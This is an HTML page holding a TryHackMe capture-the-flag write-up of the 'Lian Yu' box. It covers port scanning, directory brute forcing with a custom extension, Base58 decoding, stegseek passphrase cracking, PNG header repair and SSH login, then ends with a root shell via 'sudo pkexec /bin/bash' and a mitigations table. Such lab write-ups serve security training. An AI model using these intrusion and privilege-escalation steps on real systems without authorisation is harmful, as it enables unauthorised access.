@@ -1,0 +1,191 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lian Yu — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="A layered reconnaissance trail: a white-text hidden word on a web page pointed to a directory, an HTML comment hinted at a .ticket file extension, and a…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/lianyu.html">
+<meta property="og:title" content="Lian Yu — TryHackMe writeup">
+<meta property="og:description" content="A layered reconnaissance trail: a white-text hidden word on a web page pointed to a directory, an HTML comment hinted at a .ticket file extension, and a…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/lianyu.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Lian Yu — TryHackMe writeup","description":"A layered reconnaissance trail: a white-text hidden word on a web page pointed to a directory, an HTML comment hinted at a .ticket file extension, and a…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-07","url":"https://thecyberfarhan.github.io/writeups/lianyu.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/lianyu.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow">TryHackMe writeup</p>
+  <h1>Lian Yu</h1>
+  <div class="meta">
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Medium</span>
+    <span>June 7, 2026</span>
+  </div>
+  <div class="tldr"><b>TL;DR</b>A layered reconnaissance trail: a white-text hidden word on a web page pointed to a directory, an HTML comment hinted at a <code>.ticket</code> file extension, and a Feroxbuster scan with that custom extension surfaced a Base58-encoded FTP password. FTP served three images — one with a zip hidden via steghide (cracked passphrase: <code>password</code>), one with corrupted PNG magic bytes concealing a password hint. Fixing the header revealed the SSH password; <code>slade:M3tahuman</code> got in. <code>sudo pkexec /bin/bash</code> finished the job. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🕷 Feroxbuster</span><span class="chip">📂 FTP client</span><span class="chip">🔍 Stegseek</span><span class="chip">🔬 Steghide</span><span class="chip">🛠 Hex editor</span><span class="chip">🔑 Base58 decoder</span><span class="chip">🔐 SSH</span></div>
+  <h2>Introduction</h2>
+<p>Today's target is <strong>Lian Yu</strong> — the Arrow-themed island where Oliver Queen honed his skills, and where the box author hid credentials in increasingly elaborate places. This is the most puzzle-box-style machine in the series so far: no brute force of a login form, no SQLi, no upload bypass. Instead, the path winds through hidden white text, a custom file extension nobody would guess without a clue, steganography brute force, a corrupted image file with deliberately wrong magic bytes, and a Base58 encoding detour. It rewards patient, methodical enumeration over speed.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>Basic web enumeration and what file extensions mean for discovery tools</li><li>What steganography is and how <code>steghide</code>/<code>stegseek</code> work</li><li>What PNG magic bytes are and how to fix a corrupted file header in a hex editor</li><li>What Base58 encoding is (commonly used in Bitcoin addresses — not in passwords, until today)</li></ul>
+<h2>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<p class="aside">Full-range sweep with RustScan, Nmap for service and version fingerprinting:</p>
+<pre><code>rustscan -a 10.48.156.154 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>21/tcp</td><td>FTP</td><td>vsftpd 3.0.2</td></tr><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 6.7p1 Debian 5+deb8u8</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache (title: Purgatory)</td></tr><tr><td>111/tcp</td><td>RPC</td><td>rpcbind 2-4</td></tr><tr><td>37187/tcp</td><td>RPC status</td><td>RPC #100024</td></tr></tbody></table>
+<p>Five ports — more interesting than the usual two. The FTP server and <code>rpcbind</code> are new additions to this series. Anonymous FTP login was tried immediately and blocked:</p>
+<pre><code>ftp 10.48.156.154
+# anonymous → 530 Permission denied.</code></pre>
+<p>FTP requires credentials. The web server's title is "Purgatory" — thematic, and a clue to keep in mind. RPC ports 111 and 37187 are <code>rpcbind</code> and its associated <code>status</code> service; *these turned out to be irrelevant to the attack path and are likely just artefacts of the box's OS configuration.*</p>
+<h3>Web Enumeration — Layer 1</h3>
+<p class="aside">(~5 mins into the box)</p>
+<p class="aside">Initial Feroxbuster scan with standard extensions:</p>
+<pre><code>feroxbuster -u http://10.48.156.154 \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+  -x php,txt,html</code></pre>
+
+<pre><code># output (relevant hits only)
+301  http://10.48.156.154/island        # ^^^ key directory
+200  http://10.48.156.154/island/index.html
+301  http://10.48.156.154/island/2100   # ^^^ deeper
+200  http://10.48.156.154/island/2100/index.html</code></pre>
+<h3>Hidden Word — White Text at <code>/island/</code></h3>
+<p>Navigating to <code>/island/</code> shows what appears to be a single paragraph of in-character text. But <code>Ctrl+A</code> to select all — or a glance at the page source — reveals a word rendered in white text against a white background:</p>
+<pre><code>The Code Word is:
+vigilante</code></pre>
+<p>Invisible to a casual visitor. Visible to anyone who reads the source. The word <code>vigilante</code> becomes the FTP username — this isn't obvious yet, but it becomes clear later.</p>
+<h3>Web Enumeration — Layer 2: The <code>.ticket</code> Clue</h3>
+<p>The page at <code>/island/2100/</code> contains an embedded (unavailable) YouTube video and a single HTML comment:</p>
+<pre><code>&lt;!-- you can avail your .ticket here but how? --&gt;</code></pre>
+<p>The <code>.ticket</code> extension is non-standard — nothing would enumerate it by default. This is the box explicitly telling us what to add to Feroxbuster's extension list.</p>
+<p class="aside">Re-running Feroxbuster on <code>/island/2100/</code> with <code>.ticket</code> added:</p>
+<pre><code>feroxbuster -u http://10.48.156.154/island/2100 \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+  -x php,txt,html,.ticket</code></pre>
+
+<pre><code># output
+200  http://10.48.156.154/island/2100/green_arrow.ticket   # ^^^ found it</code></pre>
+<p class="aside">Contents of <code>green_arrow.ticket</code>:</p>
+<pre><code>RTy8yhBQdscX</code></pre>
+<p>A short string. Not plaintext, not hex, not Base64 (wrong character set). Base58 — the encoding used by Bitcoin addresses, distinguishable because it omits characters <code>0</code>, <code>O</code>, <code>I</code>, and <code>l</code> to prevent visual confusion. Decoded:</p>
+<pre><code>!#th3h00d</code></pre>
+<p>FTP password confirmed.</p>
+<h2>Foothold</h2>
+<p class="aside">(~20 mins into the box)</p>
+<h3>FTP Login — Image File Retrieval</h3>
+<p>Combining the username found in white text (<code>vigilante</code>) with the decoded ticket password (<code>!#th3h00d</code>):</p>
+<p class="aside">FTP login as <code>vigilante</code>:</p>
+<pre><code>ftp 10.48.156.154
+# Name: vigilante
+# Password: !#th3h00d
+# 230 Login successful.</code></pre>
+<p class="aside">Three files in the FTP root:</p>
+<pre><code>-rw-r--r--  Leave_me_alone.png   (511 KB)
+-rw-r--r--  Queen's_Gambit.png   (537 KB)
+-rw-r--r--  aa.jpg               (186 KB)</code></pre>
+<p>All three downloaded. Visual inspection: <code>aa.jpg</code> shows a soldier, <code>Queen's_Gambit.png</code> shows a ship. <code>Leave_me_alone.png</code> refuses to open — the file is corrupted.</p>
+<h3>Steganography — <code>aa.jpg</code></h3>
+<p><strong>What is steganography?</strong> Hiding data inside another file — typically an image — in a way that's invisible to the naked eye. <code>steghide</code> embeds data in JPEG/BMP/WAV files behind a passphrase; <code>stegseek</code> is a purpose-built brute forcer for steghide-protected files.</p>
+<p class="aside">Brute forcing the steghide passphrase on <code>aa.jpg</code>:</p>
+<pre><code>stegseek --crack aa.jpg /usr/share/wordlists/rockyou.txt</code></pre>
+
+<pre><code># output
+[i] Found passphrase: "password"
+[i] Original filename: "ss.zip"
+[i] Extracting to "aa.jpg.out"</code></pre>
+<p>Passphrase: <code>password</code>. The hidden payload is a zip archive named <code>ss.zip</code>.</p>
+<p class="aside">Extracting the zip contents:</p>
+<pre><code>unzip ss.zip</code></pre>
+<p>Two files emerge:</p>
+<ul><li><code>passwd.txt</code> — flavour text, no actionable credentials</li><li><code>shado</code> — contains a single string: <code>M3tahuman</code></li></ul>
+<p><code>M3tahuman</code> is a password. The filename <code>shado</code> is a reference to Shado, a character from the Arrow series — keeping the theme intact.</p>
+<h3>Corrupted PNG — Magic Byte Repair</h3>
+<p><code>Leave_me_alone.png</code> wouldn't open, and <code>exiftool</code> confirmed why:</p>
+<pre><code>exiftool Leave_me_alone.png</code></pre>
+
+<pre><code>Error: File format error</code></pre>
+<p class="aside">Inspecting the raw hex of the file header:</p>
+<pre><code>Corrupt:  58 45 6F AE 0A 0D 1A 0A ...
+Correct:  89 50 4E 47 0D 0A 1A 0A ...  (.PNG)</code></pre>
+<p><strong>What are magic bytes?</strong> The first few bytes of a file identify its format to the operating system and applications — independently of the file extension. PNG files must begin with the signature <code>89 50 4E 47 0D 0A 1A 0A</code>. This file's first four bytes had been deliberately overwritten, breaking the signature and preventing any image viewer from opening it.</p>
+<p class="aside">Fixing the header in a hex editor — replacing the corrupt bytes with the correct PNG signature:</p>
+<pre><code>Before: 58 45 6F AE 0A 0D 1A 0A
+After:  89 50 4E 47 0D 0A 1A 0A</code></pre>
+<p>The repaired file opened as a valid PNG image, displaying the message:</p>
+<pre><code>Just leave me alone here is what you want
+Password</code></pre>
+<p>The image confirms <code>M3tahuman</code> (extracted from <code>shado</code>) is the SSH password.</p>
+<h2>Shell / Access</h2>
+<p class="aside">(~35 mins into the box)</p>
+<p>Two SSH usernames were known from context — <code>vigilante</code> (from the web page) and <code>slade</code> (from the Arrow lore and FTP filenames). <code>vigilante</code> failed; <code>slade</code> with password <code>M3tahuman</code> connected cleanly:</p>
+<pre><code>ssh slade@10.48.156.154</code></pre>
+
+<pre><code># output (banner)
+Way To SSH...
+Loading.........Done..
+Connecting To Lian_Yu  Happy Hacking
+
+[WELCOME ASCII ART]
+
+slade@LianYu:~$</code></pre>
+<p class="aside">Collecting the user flag:</p>
+<pre><code>cat user.txt</code></pre>
+
+<pre><code>THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
+                        --Felicity Smoak</code></pre>
+
+<h2>Escalation</h2>
+<p class="aside">(~36 mins into the box)</p>
+<h3>sudo pkexec — Root Shell</h3>
+<p class="aside">Checking sudo permissions:</p>
+<pre><code>sudo -l</code></pre>
+
+<pre><code>User slade may run the following commands on LianYu:
+    (root) PASSWD: /usr/bin/pkexec</code></pre>
+<p><strong>What is <code>pkexec</code>?</strong> PolicyKit's <code>pkexec</code> is designed to allow an authorised user to run a command as another user — similar to <code>sudo</code>. When granted via <code>sudoers</code> without restriction on which program <code>pkexec</code> can *itself* execute, it becomes a direct path to a root shell. Note that unlike previous boxes, this entry uses <code>PASSWD</code> rather than <code>NOPASSWD</code> — slade's own SSH password (<code>M3tahuman</code>) is required to authenticate the <code>sudo</code> call.</p>
+<p class="aside">Spawning a root shell through pkexec:</p>
+<pre><code>sudo pkexec /bin/bash</code></pre>
+
+<pre><code># prompt for slade's password: M3tahuman
+root@LianYu:~#</code></pre>
+<p class="aside">Collecting the root flag:</p>
+<pre><code>cat /root/root.txt</code></pre>
+
+<pre><code>Mission accomplished
+
+You are injected me with Mirakuru:) ---&gt; Now slade Will become DEATHSTROKE.
+
+THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
+                                                                      --DEATHSTROKE</code></pre>
+
+<h2>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong>White-text hidden word</strong> at <code>/island/</code> → FTP username <code>vigilante</code></li><li><strong>HTML comment</strong> at <code>/island/2100/</code> → <code>.ticket</code> extension clue</li><li><strong>Feroxbuster</strong> with <code>.ticket</code> → <code>green_arrow.ticket</code> → Base58 decoded to FTP password <code>!#th3h00d</code></li><li><strong>FTP login as <code>vigilante</code></strong> → three image files downloaded</li><li><strong>Stegseek on <code>aa.jpg</code></strong> (passphrase: <code>password</code>) → <code>ss.zip</code> → <code>shado</code> file → password <code>M3tahuman</code></li><li><strong>PNG magic byte repair</strong> on <code>Leave_me_alone.png</code> → image confirmed <code>M3tahuman</code> as SSH password</li><li><strong>SSH as <code>slade</code></strong> → user flag</li><li><strong><code>sudo pkexec /bin/bash</code></strong> → root shell → root flag</li></ol>
+<h2>Rabbit Holes</h2>
+<h3><code>vigilante</code> as a Password</h3>
+<p>The word <code>vigilante</code> appeared in white text on <code>/island/</code> and immediately *felt* like a password. Anonymous FTP was already blocked, so the obvious next guess was trying <code>vigilante</code> as both username and password for FTP — no luck. It turned out to be the username, with the password buried several more steps down the chain. This is the box's main misdirection: give you half a credential early and make you work for the other half.</p>
+<h3><code>vigilante</code> SSH Login</h3>
+<p>After decoding <code>M3tahuman</code> from the zip, the first SSH attempt used <code>vigilante</code> as the username (since it was the known account name from the web page). That failed — <code>vigilante</code> doesn't appear to have a system account with password auth enabled. Switching to <code>slade</code> (the other Arrow character whose name appears contextually in the FTP files and theme) worked immediately.</p>
+<h3><code>Queen's_Gambit.png</code> — Steghide Dead End</h3>
+<p><code>Queen's_Gambit.png</code> was run through stegseek and steghide as well. *It appeared to contain no hidden data, or at least nothing extractable with rockyou.txt as the passphrase list.* The box's intended path runs only through <code>aa.jpg</code> and <code>Leave_me_alone.png</code>.</p>
+<h2>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Credentials hidden in white-on-white text</td><td class="sev-medium">Medium</td><td>Never embed credentials or hints in HTML — even "invisible" ones; source code is always readable</td></tr><tr><td>FTP accessible with guessable credentials</td><td class="sev-high">High</td><td>Disable FTP entirely if not needed; if required, enforce strong passwords and restrict by IP</td></tr><tr><td>Sensitive files (images with hidden data) served over FTP</td><td class="sev-high">High</td><td>Never store credential-bearing files on network-accessible servers; restrict FTP directories strictly</td></tr><tr><td>Password hidden in steganographic zip (<code>password</code> passphrase)</td><td class="sev-high">High</td><td>If steganography must be used for legitimate purposes, use a strong, unique passphrase</td></tr><tr><td>Corrupted PNG concealing password hint</td><td class="sev-medium">Medium</td><td>Security through obscurity is not security — file header manipulation delays but does not prevent discovery</td></tr><tr><td><code>sudo pkexec /bin/bash</code> allowed</td><td class="sev-critical">Critical</td><td>Never grant unrestricted <code>pkexec</code> via <code>sudoers</code>; restrict it to specific, non-shell-spawning operations if required at all</td></tr></tbody></table>
+  <div class="takeaway"><b>Key takeaway</b>Enumeration isn't just running the same tools with the same flags every time — Lian Yu's key step was adding <code>.ticket</code> to Feroxbuster's extension list based on a clue buried in an HTML comment. Paying attention to what the target is telling you, not just what your tools return by default, is what separates a methodical tester from one who gives up at the first dead end.</div>
+  <h2>If I Did It Again</h2>
+<p>Check the page source of every web page manually before running directory scanners — the <code>.ticket</code> clue and the <code>vigilante</code> white-text were both in the HTML. Reading those first would have shaved significant scan time and gotten to the FTP credentials faster.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/lianyu_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+</body>
+</html>
